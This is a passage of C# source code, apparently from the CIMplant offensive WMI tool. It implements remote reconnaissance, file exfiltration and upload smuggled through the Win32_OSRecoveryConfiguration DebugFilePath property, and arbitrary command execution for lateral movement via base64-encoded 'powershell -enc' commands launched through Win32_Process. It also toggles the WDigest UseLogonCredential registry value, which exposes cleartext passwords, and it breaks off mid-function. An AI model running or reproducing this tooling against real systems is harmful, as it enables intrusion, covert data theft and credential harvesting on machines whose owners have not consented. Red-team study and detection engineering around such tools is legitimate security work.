using CIMplant;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Security;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace Execute
{
    public class GetMethods
    {
        public string RegGetMethod, RegSetMethod;
        public GetMethods(string regValueType)
        {
            switch (regValueType)
            {
                case "REG_SZ":
                    RegGetMethod = "GetStringValue";
                    RegSetMethod = "SetStringValue";
                    break;
                case "REG_BINARY":
                    RegGetMethod = "GetBinaryValue";
                    RegSetMethod = "SetBinaryValue";
                    break;
                case "REG_DWORD":
                    RegGetMethod = "GetDWORDValue";
                    RegSetMethod = "SetDWORDValue";
                    break;
            }
        }
    }

    public class ExecuteWmi
    {
        public static object basic_info(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;

            //Query system for Operating System information
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            foreach (ManagementBaseObject o in queryCollection)
            {
                ManagementObject wmiObject = (ManagementObject) o;
                // Display the remote computer information
                Console.WriteLine("{0,-20}: {1,-10}", "Computer Name", wmiObject["csname"]);
                Console.WriteLine("{0,-20}: {1,-10}", "Windows Directory", wmiObject["WindowsDirectory"]);
                Console.WriteLine("{0,-20}: {1,-10}", "Operating System", wmiObject["Caption"]);
                Console.WriteLine("{0,-20}: {1,-10}", "Version", wmiObject["Version"]);
                Console.WriteLine("{0,-20}: {1,-10}", "Manufacturer", wmiObject["Manufacturer"]);
                Console.WriteLine("{0,-20}: {1,-10}", "Number of Users", wmiObject["NumberOfUsers"]);
                Console.WriteLine("{0,-20}: {1,-10}", "Registered User", wmiObject["RegisteredUser"]);
            }

            return queryCollection;
        }

        public static object active_users(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;

            List<string> users = new List<string>();
            ObjectQuery query = new ObjectQuery("SELECT LogonId FROM Win32_LogonSession Where LogonType=2");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject) o;
                ObjectQuery lQuery = new ObjectQuery("Associators of {Win32_LogonSession.LogonId=" +
                                                     wmiObject["LogonId"] +
                                                     "} Where AssocClass=Win32_LoggedOnUser Role=Dependent");
                ManagementObjectSearcher lSearcher = new ManagementObjectSearcher(scope, lQuery);
                foreach (var managementBaseObject in lSearcher.Get())
                {
                    var lWmiObject = (ManagementObject) managementBaseObject;
                    users.Add(lWmiObject["Domain"].ToString() + "\\" + lWmiObject["Name"].ToString());
                }
            }

            Console.WriteLine("{0,-15}", "Active Users");
            Console.WriteLine("{0,-15}", "------------");
            List<string> distinctUsers = users.Distinct().ToList();
            foreach (string user in distinctUsers)
                Console.WriteLine("{0,-15}", user);

            return queryCollection;
        }

        public static object drive_list(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;

            ObjectQuery query =
                new ObjectQuery(
                    "SELECT * FROM Win32_LogicalDisk WHERE DriveType = 3 OR DriveType = 4 OR DriveType = 2");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            Console.WriteLine("{0,-15}", "Drive List");
            Console.WriteLine("{0,-15}", "----------");
            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject) o;
                Console.WriteLine("{0,-15}", wmiObject["DeviceID"]);
            }

            return queryCollection;
        }

        public object ifconfig(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;

            //This could probably use some work to look better
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject) o;
                if (!IsNullOrEmpty((string[]) wmiObject["IPAddress"]))
                {
                    string[] defaultGateway = (string[]) (wmiObject["DefaultIPGateway"]);
                    try
                    {
                        Console.WriteLine("{0,-20}: {1,-10}", "DHCP Enabled", wmiObject["DHCPEnabled"]);
                        Console.WriteLine("{0,-20}: {1,-10}", "DNS Domain", wmiObject["DNSDomain"]);
                        Console.WriteLine("{0,-20}: {1,-10}", "Service Name", wmiObject["ServiceName"]);
                        Console.WriteLine("{0,-20}: {1,-10}", "Description", wmiObject["Description"]);
                        Console.WriteLine("{0,-20}: {1,-10}", "Default Gateway", defaultGateway[0]);
                    }
                    catch
                    {
                        //pass
                    }

                    foreach (string i in (string[]) wmiObject["IPAddress"])
                    {
                        if (IPAddress.TryParse(i, out IPAddress address))
                        {
                            switch (address.AddressFamily)
                            {
                                case System.Net.Sockets.AddressFamily.InterNetwork:
                                    Console.WriteLine("{0,-20}: {1,-10}", "IP Address", address);
                                    break;
                                default:
                                    break;
                            }
                        }
                    }
                }
            }

            return queryCollection;
        }

        public object installed_programs(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;

            ManagementClass mc = new ManagementClass("stdRegProv")
            {
                Scope = scope
            };

            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Product");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            Console.WriteLine("{0,-45}{1,-30}{2,20}{3,30}", "Application", "InstallDate", "Version", "Vendor");
            Console.WriteLine("{0,-45}{1,-30}{2,20}{3,30}", "-----------", "-----------", "-------", "------");
            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject) o;
                if (wmiObject["Name"] != null)
                {
                    string name = (string) wmiObject["Name"];
                    if (name.Length > 35)
                        name = Truncate(name, 35) + "...";

                    try
                    {
                        Console.WriteLine("{0,-45}{1,-30}{2,20}{3,30}", name,
                            DateTime.ParseExact((string) wmiObject["InstallDate"], "yyyyMMdd", null),
                            wmiObject["Version"], wmiObject["Vendor"]);
                    }
                    catch
                    {
                        //value probably doesn't exist, so just pass
                    }
                }
            }

            return queryCollection;
        }

        public object Win32Shutdown(Planter planter)
        {
            // This handles logoff, reboot/restart, and shutdown/poweroff
            ManagementScope scope = planter.Connector.ConnectedWmiSession;
            string command = planter.Commander.Command;

            SelectQuery query = new SelectQuery("Win32_OperatingSystem");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject) o;
                // Obtain in-parameters for the method
                ManagementBaseObject inParams = wmiObject.GetMethodParameters("Win32Shutdown");

                switch (command)
                {
                    case "logoff":
                    case "logout":
                        inParams["Flags"] = 4;
                        break;
                    case "reboot":
                    case "restart":
                        inParams["Flags"] = 6;
                        break;
                    case "power_off":
                    case "shutdown":
                        inParams["Flags"] = 5;
                        break;
                }

                // Execute the method and obtain the return values.
                ManagementBaseObject outParams = wmiObject.InvokeMethod("Win32Shutdown", inParams, null);
            }

            return queryCollection;

        }

        public object vacant_system(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;

            List<string> allProcs = new List<string>();
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Process");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject) o;
                allProcs.Add(wmiObject["Caption"].ToString());
            }

            // If screen saver or logon screen on
            if (allProcs.FirstOrDefault(s => s.Contains(".scr")) != null |
                allProcs.FirstOrDefault(s => s.Contains("LogonUI.exe")) != null)
            {
                Console.WriteLine("Screensaver or Logon screen is active on " + planter.System);
            }

            else
            {
                // Get active users on the system
                List<string> users = new List<string>();
                ObjectQuery newQuery = new ObjectQuery("SELECT LogonId FROM Win32_LogonSession Where LogonType=2");
                ManagementObjectSearcher newSearcher = new ManagementObjectSearcher(scope, newQuery);

                foreach (var o in newSearcher.Get())
                {
                    var wmiObject = (ManagementObject) o;
                    ObjectQuery lQuery = new ObjectQuery("Associators of {Win32_LogonSession.LogonId=" +
                                                         wmiObject["LogonId"] +
                                                         "} Where AssocClass=Win32_LoggedOnUser Role=Dependent");
                    ManagementObjectSearcher lSearcher = new ManagementObjectSearcher(scope, lQuery);
                    foreach (var managementBaseObject in lSearcher.Get())
                    {
                        var lWmiObject = (ManagementObject) managementBaseObject;
                        users.Add(lWmiObject["Name"].ToString());
                    }
                }

                Console.WriteLine("[-] System not vacant\n");
                Console.WriteLine("{0,-15}", "Active Users on " + planter.System);
                Console.WriteLine("{0,-15}", "--------------------------------");
                List<string> distinctUsers = users.Distinct().ToList();
                foreach (string user in distinctUsers)
                    Console.WriteLine("{0,-15}", user);
            }

            return queryCollection;
        }


        ///////////////////////////////////////           FILE OPERATIONS            /////////////////////////////////////////////////////////////////////

        // WORKING CURRENTLY BUT WITH POWERSHELL :(//
        public object cat(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;
            string path = planter.Commander.File;

            if (!CheckForFile(path, scope, verbose:true))
            {
                //Messenger.ErrorMessage("[-] Specified file does not exist, not running PS runspace\n");
                return null;
            }

            string originalWmiProperty = GetOsRecovery(scope);
            bool wsman = true;

            Messenger.GoodMessage("[+] Printing file: " + path);
            Messenger.GoodMessage("--------------------------------------------------------\n");

            if (wsman == true)
            {
                // We can modify this later easily to pass wsman if needed
                using (PowerShell powershell = PowerShell.Create())
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(planter.Password?.ToString()))
                            powershell.Runspace = RunspaceCreate(planter);
                        else
                        {
                            // Since we can't run a local runspace as admin let's just grab the file using normal c# code (pro: avoids PS)
                            //powershell.Runspace = RunspaceCreateLocal();
                            // We might need to catch if people try to cat binary files in the future
                            Console.WriteLine(System.IO.File.ReadAllText(path));
                            return true;
                        }
                    }
                    catch (System.Management.Automation.Remoting.PSRemotingTransportException)
                    {
                        wsman = false;
                    }
                    catch (UnauthorizedAccessException)
                    {
                        Messenger.ErrorMessage("[-] Error: Access to the file is denied. If running against the local system use Admin prompt.");
                        return null;
                    }

                    if (powershell.Runspace.ConnectionInfo != null)
                    {
                        string command1 = "$data = (Get-Content " + path + " | Out-String).Trim()";
                        const string command2 = @"$encdata = [Int[]][Char[]]$data -Join ','";
                        const string command3 =
                            @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";

                        powershell.Commands.AddScript(command1, false);
                        powershell.Commands.AddScript(command2, false);
                        powershell.Commands.AddScript(command3, false);
                        powershell.Invoke();
                    }
                    else
                        wsman = false;
                }
            }

            if (wsman == false)
            {
                // WSMAN not enabled on the remote system, use another method
                ObjectGetOptions options = new ObjectGetOptions();
                ManagementPath pather = new ManagementPath("Win32_Process");
                ManagementClass classInstance = new ManagementClass(scope, pather, options);
                ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");

                string encodedCommand = "$data = (Get-Content " + path +
                                        " | Out-String).Trim(); $encdata = [Int[]][Char[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
                var encodedCommandB64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));

                inParams["CommandLine"] = "powershell -enc " + encodedCommandB64;
                ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
            }

            // Give it a second to write and check for changes to DebugFilePath
            Thread.Sleep(1000);
            CheckForFinishedDebugFilePath(originalWmiProperty, scope);

            //Get the contents of the file in the DebugFilePath prop
            string[] fileOutput = GetOsRecovery(scope).Split(',');

            StringBuilder output = new StringBuilder();

            //Print file output.
            foreach (string integer in fileOutput)
            {
                char a = (char) Convert.ToInt32(integer);
                output.Append(a);
            }

            Console.WriteLine(output);
            SetOsRecovery(scope, originalWmiProperty);

            return true;
        }

        public object copy(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;
            string startPath = planter.Commander.File;
            string endPath = planter.Commander.FileTo;

            if (!CheckForFile(startPath, scope, verbose:true))
            {
                //Make sure the file actually exists before doing any more work. I hate doing work with no goal
                Messenger.ErrorMessage(
                    "[-] Specified file does not exist, please specify a file on the remote machine that exists\n");
                return null;
            }

            if (CheckForFile(endPath, scope, verbose:false))
            {
                //Won't work if the resulting file exists
                Messenger.ErrorMessage(
                    "[-] Specified copy to file exists, please specify a file to copy to on the remote system that does not exist\n");
                return null;
            }

            Messenger.GoodMessage("[+] Copying file: " + startPath + " to " + endPath);
            Messenger.GoodMessage("--------------------------------------------------------\n");
            string newPath = startPath.Replace("\\", "\\\\");
            string newEndPath = endPath.Replace("\\", "\\\\");

            ObjectQuery query = new ObjectQuery($"SELECT * FROM CIM_DataFile Where Name='{newPath}' ");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject) o;
                // Obtain in-parameters for the method
                ManagementBaseObject inParams = wmiObject.GetMethodParameters("Copy");

                inParams["FileName"] = newEndPath;

                // Execute the method and obtain the return values.
                ManagementBaseObject outParams = wmiObject.InvokeMethod("Copy", inParams, null);
            }

            return queryCollection;
        }


        public object download(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;
            string downloadPath = planter.Commander.File;
            string writePath = planter.Commander.FileTo;

            if (!CheckForFile(downloadPath, scope, verbose:true))
            {
                //Messenger.ErrorMessage("[-] Specified file does not exist, not running PS runspace\n");
                return null;
            }

            string originalWmiProperty = GetOsRecovery(scope);
            bool wsman = true;

            Messenger.GoodMessage("[+] Downloading file: " + downloadPath);
            Messenger.GoodMessage("--------------------------------------------------------\n");

            if (wsman == true)
            {
                // We can modify this later easily to pass wsman if needed
                using (PowerShell powershell = PowerShell.Create())
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(planter.Password?.ToString()))
                            powershell.Runspace = RunspaceCreate(planter);
                        else
                            powershell.Runspace = RunspaceCreateLocal();
                    }
                    catch (System.Management.Automation.Remoting.PSRemotingTransportException)
                    {
                        wsman = false;
                    }

                    if (powershell.Runspace.ConnectionInfo != null)
                    {
                        string command1 = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath + "'";
                        const string command2 = @"$encdata = [Int[]][byte[]]$data -Join ','";
                        const string command3 =
                            @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";

                        powershell.Commands.AddScript(command1, false);
                        powershell.Commands.AddScript(command2, false);
                        powershell.Commands.AddScript(command3, false);
                        powershell.Invoke();
                    }
                    else
                        wsman = false;
                }
            }

            if (wsman == false)
            {
                // WSMAN not enabled on the remote system, use another method
                ObjectGetOptions options = new ObjectGetOptions();
                ManagementPath pather = new ManagementPath("Win32_Process");
                ManagementClass classInstance = new ManagementClass(scope, pather, options);
                ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");

                string encodedCommand = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath +
                         "'; $encdata = [Int[]][byte[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
                var encodedCommandB64 =
                    Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
                
                string fullCommand = "powershell -enc " + encodedCommandB64;

                inParams["CommandLine"] =  fullCommand;

                ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);

            }

            // Give it a second to write and check for changes to DebugFilePath
            Thread.Sleep(1000);
            CheckForFinishedDebugFilePath(originalWmiProperty, scope);

            //Get the contents of the file in the DebugFilePath prop
            string[] fileOutput = GetOsRecovery(scope).Split(',');

            //Create list for bytes
            List<byte> outputList = new List<byte>();

            //Convert from int (bytes) to byte
            foreach (string integer in fileOutput)
            {
                try
                {
                    byte a = (byte) Convert.ToInt32(integer);
                    outputList.Add(a);
                }
                catch
                {
                    //pass
                }
            }

            //Save to local dir if no directory specified
            if (string.IsNullOrEmpty(writePath))
                writePath = Path.GetFileName(downloadPath);

            File.WriteAllBytes(writePath, outputList.ToArray());

            SetOsRecovery(scope, originalWmiProperty);
            return true;
        }

        public object ls(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;
            string path = planter.Commander.Directory;

            string drive = path.Substring(0, 2);
            Messenger.GoodMessage("[+] Listing directory: " + path + "\n");
            if (!path.EndsWith("\\"))
            {
                path += "\\";
            }
            string newPath = path.Remove(0, 2).Replace("\\", "\\\\");

            ObjectQuery fileQuery = new ObjectQuery($"SELECT * FROM CIM_DataFile Where Drive='{drive}' AND Path='{newPath}' ");
            ManagementObjectSearcher fileSearcher = new ManagementObjectSearcher(scope, fileQuery);
            ManagementObjectCollection queryCollection = fileSearcher.Get();

            Console.WriteLine("{0,-30}", "Files");
            Console.WriteLine("{0,-30}", "-----------------");
            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject) o;
                // Write all files to screen
                Console.WriteLine("{0}", Path.GetFileName((string)wmiObject["Name"]));// String
            }

            ObjectQuery folderQuery = new ObjectQuery($"SELECT * FROM Win32_Directory Where Drive='{drive}' AND Path='{newPath}' ");
            ManagementObjectSearcher folderSearcher = new ManagementObjectSearcher(scope, folderQuery);
            ManagementObjectCollection folderQueryCollection = folderSearcher.Get();

            Console.WriteLine("\n{0,-30}", "Folders");
            Console.WriteLine("{0,-30}", "-----------------");
            foreach (var o in folderQueryCollection)
            {
                var wmiObject = (ManagementObject) o;
                // Write all folders to screen
                Console.WriteLine("{0}", Path.GetFileName((string)wmiObject["Name"]));// String
            }

            return queryCollection;
        }

        public object search(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;
            string path = planter.Commander.Directory;
            string file = planter.Commander.File;

            ///////// Will probably have to add more tests in here in case the user decides to do some funny business ///////////
            string drive = path.Substring(0, 2);
            string fileName;

            Messenger.GoodMessage($"[+] Searching for file like '{file}' within directory {path} \n");
            if (!path.EndsWith("\\"))
            {
                path += "\\";
            }
            string newPath = path.Remove(0, 2).Replace("\\", "\\\\");

            //Build it vs sending in ObjectQuery so we can modify it accordingly (add extension qualifier and whatnot)
            string queryString = $"SELECT * FROM CIM_DataFile WHERE Drive='{drive}'";

            //Check to see if the user want's to search the whole drive (will be slowww)
            if (newPath == "\\\\")
            {
                //do nothing
            }
            else
                queryString += $" AND Path='{newPath}'";

            //Parse the file so we can modify the search accordingly
            if (!string.IsNullOrEmpty(Path.GetExtension(file)))
            {
                string extension = Path.GetExtension(file);
                extension = extension.Remove(0, 1); //remove the dot from the extension
                fileName = Path.GetFileNameWithoutExtension(file);
                queryString += $" AND Extension='{extension}'";
            }
            else
                fileName = file;

            //Parse for * sent in filename
            if (fileName.Contains("*"))
                fileName = fileName.Replace("*", "%");

            if (!string.IsNullOrEmpty(fileName))
                queryString += $" AND FileName LIKE '{fileName}'";

            ObjectQuery fileQuery = new ObjectQuery(queryString);
            ManagementObjectSearcher fileSearcher = new ManagementObjectSearcher(scope, fileQuery);
            ManagementObjectCollection queryCollection = fileSearcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject) o;
                // Write all files to screen
                Console.WriteLine("{0}", Path.GetFileName((string)wmiObject["Name"]));// String
            }

            return queryCollection;
        }

        public object upload(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;
            string uploadFile = planter.Commander.File;
            string writePath = planter.Commander.FileTo;

            if (!File.Exists(uploadFile))
            {
                Messenger.ErrorMessage("[-] Specified local file does not exist, not running PS runspace\n");
                return null;
            }

            string originalWmiProperty = GetOsRecovery(scope);
            bool wsman = true;

            Messenger.GoodMessage("[+] Uploading file: " + uploadFile + " to " + writePath);
            Messenger.GoodMessage("--------------------------------------------------------------------\n");

            List<int> intList = new List<int>();
            byte[] uploadFileBytes = File.ReadAllBytes(uploadFile);

            //Convert from byte to int (bytes)
            foreach (byte uploadByte in uploadFileBytes)
            {
                int a = uploadByte;
                intList.Add(a);
            }

            SetOsRecovery(scope, string.Join(",", intList));

            // Give it a second to write and check for changes to DebugFilePath
            Thread.Sleep(1000);
            CheckForFinishedDebugFilePath(originalWmiProperty, scope);

            if (wsman == true)
            {
                // We can modify this later easily to pass wsman if needed
                using (PowerShell powershell = PowerShell.Create())
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(planter.Password?.ToString()))
                            powershell.Runspace = RunspaceCreate(planter);
                        else
                            powershell.Runspace = RunspaceCreateLocal();
                    }
                    catch (System.Management.Automation.Remoting.PSRemotingTransportException)
                    {
                        wsman = false;
                    }

                    if (powershell.Runspace.ConnectionInfo != null)
                    {
                        const string command1 =
                        @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath";
                        const string command2 = @"$decode = [byte[]][int[]]$encdata.Split(',') -Join ' '";
                        string command3 =
                            @"[byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
                            writePath + "' -Value $decoded";

                        powershell.Commands.AddScript(command1, false);
                        powershell.Commands.AddScript(command2, false);
                        powershell.Commands.AddScript(command3, false);
                        powershell.Invoke();
                    }
                    else
                        wsman = false;
                }
            }

            if (wsman == false)
            {
                // WSMAN not enabled on the remote system, use another method
                ObjectGetOptions options = new ObjectGetOptions();
                ManagementPath pather = new ManagementPath("Win32_Process");
                ManagementClass classInstance = new ManagementClass(scope, pather, options);
                ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");

                string encodedCommand =
                    "$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath; $decode = [byte[]][int[]]$encdata.Split(',') -Join ' '; [byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
                    writePath + "' -Value $decoded";
                var encodedCommandB64 =
                    Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));

                inParams["CommandLine"] = "powershell -enc " + encodedCommandB64;

                ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);

                // Give it a second to write
                Thread.Sleep(1000);
            }

            // Set OSRecovery back to normal pls
            SetOsRecovery(scope, originalWmiProperty);
            return true;
        }


        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        ///////////////////////////////////////////////          Lateral Movement Facilitation            /////////////////////////////////////////////////////////////////////


        public object command_exec(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;
            string command = planter.Commander.Execute;
            string[] newProcs = { "powershell.exe", "notepad.exe", "cmd.exe" };

            // Create a timeout for creating a new process
            TimeSpan timeout = new TimeSpan(0, 0, 30);

            string originalWmiProperty = GetOsRecovery(scope);
            bool wsman = true;
            bool noDebugCheck = newProcs.Any(command.Split(' ')[0].ToLower().Contains);


            Messenger.GoodMessage("[+] Executing command: " + planter.Commander.Execute);
            Messenger.GoodMessage("--------------------------------------------------------\n");

            if (wsman == true)
            {
                // We can modify this later easily to pass wsman if needed
                using (PowerShell powershell = PowerShell.Create())
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(planter.System?.ToString()))
                            powershell.Runspace = RunspaceCreate(planter);
                        else
                        {
                            powershell.Runspace = RunspaceCreateLocal();
                            powershell.AddCommand(command);
                            Collection<PSObject> result = powershell.Invoke();
                            foreach (PSObject a in result)
                            {
                                Console.WriteLine(a);
                            }

                            return true;
                        }
                    }
                    catch (System.Management.Automation.Remoting.PSRemotingTransportException)
                    {
                        wsman = false;
                        goto GetOut; // Do this so we're not doing below work when we don't need to
                    }

                    if (powershell.Runspace.ConnectionInfo != null)
                    {
                        string command1 = "$data = (" + command + " | Out-String).Trim()";
                        const string command2 = @"$encdata = [Int[]][Char[]]$data -Join ','";
                        const string command3 =
                            @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";

                        powershell.Commands.AddScript(command1, false);
                        powershell.Commands.AddScript(command2, false);
                        powershell.Commands.AddScript(command3, false);

                        // If running powershell.exe let's run it and not worry about the output otherwise it will hang for very long time
                        if (noDebugCheck)
                        {
                            // start the timer and get a timeout
                            DateTime startTime = DateTime.Now;
                            IAsyncResult asyncPs = powershell.BeginInvoke();

                            while (asyncPs.IsCompleted == false)
                            {
                                //Console.WriteLine("Waiting for pipeline to finish...");
                                Thread.Sleep(10000);

                                // Check on our timeout here
                                TimeSpan elasped = DateTime.Now.Subtract(startTime);
                                if (elasped > timeout)
                                    break;
                            }
                            //powershell.EndInvoke(asyncPs);
                        }
                        else
                            powershell.Invoke();
                    }
                    else
                        wsman = false;
                }
            }

            GetOut:
            if (wsman == false)
            {
                if (string.IsNullOrEmpty(planter.System?.ToString()))
                {
                    try
                    {
                        ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command)
                        {
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };

                        Process proc = new Process { StartInfo = procStartInfo };
                        proc.Start();

                        // Get the output into a string
                        string result = proc.StandardOutput.ReadToEnd();
                        // Display the command output.
                        Console.WriteLine(result);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }

                    return true;
                }

                // WSMAN not enabled on the remote system, use another method
                ObjectGetOptions options = new ObjectGetOptions();
                ManagementPath pather = new ManagementPath("Win32_Process");
                ManagementClass classInstance = new ManagementClass(scope, pather, options);
                ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");

                string encodedCommand = "$data = (" + command +
                                        " | Out-String).Trim(); $encdata = [Int[]][Char[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";

                var encodedCommandB64 =
                    Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));

                inParams["CommandLine"] = "powershell -enc " + encodedCommandB64;

                if (noDebugCheck)
                {
                    // Method Options to set a timeout
                    InvokeMethodOptions methodOptions = new InvokeMethodOptions(null, timeout);

                    ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, methodOptions);
                }
                else
                {
                    ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
                }
            }

            if (!noDebugCheck)
            {
                // Give it a second to write and check for changes to DebugFilePath
                Thread.Sleep(5000);
                CheckForFinishedDebugFilePath(originalWmiProperty, scope);


                //Get the contents of the file in the DebugFilePath prop
                string[] commandOutput = GetOsRecovery(scope).Split(',');
                StringBuilder output = new StringBuilder();

                //Print output.
                foreach (string integer in commandOutput)
                {
                    try
                    {
                        char a = (char)Convert.ToInt32(integer);
                        output.Append(a);
                    }
                    catch
                    {
                        //pass
                    }
                }

                Console.WriteLine(output);
            }
            else
                Console.WriteLine("New process spawned, not checking for output");

            SetOsRecovery(scope, originalWmiProperty);
            return true;
        }


        public object disable_wdigest(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;

            object oValue = 0;
            ManagementClass mc = new ManagementClass("stdRegProv")
            {
                Scope = scope
            };

            ManagementBaseObject inParams = mc.GetMethodParameters("GetDWORDValue");
            inParams["hDefKey"] = 0x80000002; // HKEY_LOCAL_MACHINE
            inParams["sSubKeyName"] = "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest";
            inParams["sValueName"] = "UseLogonCredential";

            ManagementBaseObject outParams = mc.InvokeMethod("GetDWORDValue", inParams, null);

            if (Convert.ToUInt32(outParams["ReturnValue"]) == 0)
            {
                oValue = outParams["uValue"].ToString();
                if ((string) oValue != "0")
                {
                    // wdigest is enabled, let's disable it

                    ManagementBaseObject inParamsSet = mc.GetMethodParameters("SetDWORDValue");
                    inParamsSet["hDefKey"] = 0x80000002; // HKEY_LOCAL_MACHINE
                    inParamsSet["sSubKeyName"] = "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest";
                    inParamsSet["sValueName"] = "UseLogonCredential";
                    inParamsSet["uValue"] = 0x00000000;

                    ManagementBaseObject outParamsSet = mc.InvokeMethod("SetDWORDValue", inParamsSet, null);

                    Console.WriteLine(outParamsSet != null && Convert.ToUInt32(outParamsSet["ReturnValue"]) == 0
                        ? "Successfully disabled wdigest"
                        : "Error disabling wdigest");
                }
                else
                    Console.WriteLine("wdigest already disabled");
            }
            else
            {
                // GetDWORDValue call failed
                throw new PropertyNotFoundException();
            }

            return true;
        }

        public object enable_wdigest(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;

            ManagementClass mc = new ManagementClass("stdRegProv")
            {
                Scope = scope
            };

            ManagementBaseObject inParams = mc.GetMethodParameters("GetDWORDValue");
            inParams["hDefKey"] = 0x80000002; // HKEY_LOCAL_MACHINE
            inParams["sSubKeyName"] = "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest";
            inParams["sValueName"] = "UseLogonCredential";

            ManagementBaseObject outParams = mc.InvokeMethod("GetDWORDValue", inParams, null);

            if (outParams != null && Convert.ToUInt32(outParams["ReturnValue"]) == 0)
            {
                object oValue = outParams["uValue"].ToString();
                if ((string) oValue == "1")
                {
                    // wdigest is enabled
                    Console.WriteLine("wdigest already enabled");
                }
                else
                {
                    //wdigest not enabled, let's enable it
                    ManagementBaseObject inParamsSet = mc.GetMethodParameters("SetDWORDValue");
                    inParamsSet["hDefKey"] = 0x80000002; // HKEY_LOCAL_MACHINE
                    inParamsSet["sSubKeyName"] = "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest";
                    inParamsSet["sValueName"] = "UseLogonCredential";
                    inParamsSet["uValue"] = 0x00000001;

